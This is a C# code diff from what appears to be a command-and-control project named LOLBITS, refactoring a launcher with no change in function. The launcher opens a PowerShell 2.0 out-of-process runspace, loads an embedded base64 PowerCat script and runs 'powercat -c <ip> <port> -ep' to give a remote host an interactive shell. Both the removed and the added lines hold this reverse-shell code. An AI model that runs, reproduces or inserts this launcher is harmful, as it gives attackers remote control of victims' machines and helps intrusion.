@@ -8,26 +8,26 @@ namespace LOLBITS.Controlling
     {
         public static void Main(string ip, string port)
         {
-            LauncherPowershell obj = new LauncherPowershell();
+            var obj = new LauncherPowershell();
 
-            Thread thr1 = new Thread(ExecutePowershell);
+            var thr1 = new Thread(ExecutePowershell);
 
-            object[] a = new object[] {ip, port };
+            var a = new object[] {ip, port };
             thr1.Start(a);
         }
 
-        public static void ExecutePowershell(object args)
+        private static void ExecutePowershell(object args)
         {
-            object[] a = (object[])args;
-            string ip = (string)a[0];
-            string port = (string)a[1];
-            PowerShellProcessInstance instance = new PowerShellProcessInstance(new Version(2, 0), null, null, false);
+            var a = (object[])args;
+            var ip = (string)a[0];
+            var port = (string)a[1];
+            var instance = new PowerShellProcessInstance(new Version(2, 0), null, null, false);
             
-            using (Runspace rs = RunspaceFactory.CreateOutOfProcessRunspace(new TypeTable(new string[0]), instance))
+            using (var rs = RunspaceFactory.CreateOutOfProcessRunspace(new TypeTable(new string[0]), instance))
             {
                 rs.Open();
 
-                Pipeline pipeline = rs.CreatePipeline();
+                var pipeline = rs.CreatePipeline();
                 pipeline.Commands.AddScript(PowerCat.PowerCatBase64());
                 pipeline.Commands.AddScript("powercat -c " + ip + "  " + port + " -ep");
                 pipeline.Invoke();
